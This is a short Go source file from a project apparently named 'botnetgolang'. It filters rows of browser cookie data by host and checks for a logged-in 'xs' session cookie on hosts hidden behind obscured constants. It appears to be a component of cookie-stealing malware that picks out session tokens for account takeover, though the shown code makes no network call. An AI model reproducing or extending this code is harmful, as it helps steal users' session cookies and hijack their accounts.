package pkg

import (
	_const "botnetgolang/internal/const"
	"strings"
)

func CheckLogin(cookie []map[string]interface{}) interface{} {
	for _, row := range cookie {
		value, ok := row["host_key"].(string)
		if !ok {
			continue
		}
		if row["name"] == "xs" && strings.Contains(value, _const.Cfff) {
			return row

		}
	}
	return nil
}

func FilterCookieConditions(cookie []map[string]interface{}) []map[string]interface{} {
	var results []map[string]interface{}

	for _, row := range cookie {
		if row["host_key"] == _const.Cggg || row["host_key"] == _const.Clll || row["host_key"] == _const.Cfff {
			results = append(results, row)
		}

	}
	return results
}
